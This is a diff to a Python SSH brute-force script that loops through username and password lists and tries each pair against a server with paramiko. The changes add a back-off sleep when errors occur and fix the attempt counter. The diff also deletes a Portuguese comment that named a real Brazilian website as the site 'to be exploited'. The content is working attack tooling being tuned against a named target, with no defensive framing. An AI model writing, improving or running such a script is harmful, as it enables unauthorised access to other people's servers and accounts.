@@ -5,9 +5,6 @@ import Util
 import sys
 from optparse import OptionParser
 
-# site a ser explorado
-# cidic.com.br
-
 def attempt(server, port, username, password):
     try:
         ssh = paramiko.SSHClient()
@@ -22,7 +19,8 @@ def attempt(server, port, username, password):
         except socket.error as error:
             pass
         except paramiko.SSHException as error:
-            pass
+            time.sleep(10)
+            return
         except Exception as error:
             print("Unknown error: " + error)
             pass
@@ -64,8 +62,8 @@ if __name__ == "__main__":
     i = 0
 
     for username in usernames:
-        i = i + 1
         for password in passwords:
+            i = i + 1
             try:
                 attempt(server, port, username, password)
                 time.sleep(0.3)
